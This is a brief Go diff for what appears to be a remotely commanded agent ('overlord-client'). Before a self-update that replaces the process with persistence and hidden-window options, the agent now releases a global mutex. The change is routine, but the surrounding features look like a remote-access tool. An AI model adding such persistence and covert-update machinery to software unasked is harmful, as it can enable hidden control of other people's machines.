@@ -12,6 +12,7 @@ import (
 	"strings"
 	"time"
 
+	"overlord-client/cmd/agent/mutex"
 	"overlord-client/cmd/agent/persistence"
 	agentRuntime "overlord-client/cmd/agent/runtime"
 	"overlord-client/cmd/agent/wire"
@@ -44,6 +45,7 @@ func HandleAgentUpdate(ctx context.Context, env *agentRuntime.Env, cmdID string,
 		defer recoverAndLog("agent update", nil)
 		// Let the command_result flush before beginning process replacement.
 		time.Sleep(250 * time.Millisecond)
+		mutex.ReleaseGlobal()
 		if err := runAgentUpdate(sourceAbs, env.Cfg.EnablePersistence, hideWindow); err != nil {
 			log.Printf("agent_update: %v", err)
 			return
